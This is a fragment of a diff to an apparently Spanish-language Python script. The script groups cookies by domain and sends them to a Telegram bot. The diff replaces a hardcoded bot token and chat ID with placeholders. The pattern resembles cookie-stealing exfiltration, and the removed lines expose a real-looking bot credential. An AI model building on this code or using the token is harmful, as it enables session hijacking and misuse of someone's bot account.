@@ -66,8 +66,8 @@ for cookie in cookies:
     cookies_por_dominio[archivo].append(linea)
 
 # Configuración Telegram (reemplaza con tus datos)
-TOKEN = '7587290334:AAFaxticxyduSRYKMeFVm7HBppD7MJyWeas'
-CHAT_ID = '7390299872'
+TOKEN = 'tu_token_aqui'  # Aquí pones el token de tu bot de Telegram @BotFather
+CHAT_ID = 'tu_chat_id_aqui'  # Aquí pones el chat_id que obtuviste del @userinfoBot 
 
 # Procesar y enviar archivos
 for archivo, lineas in cookies_por_dominio.items():
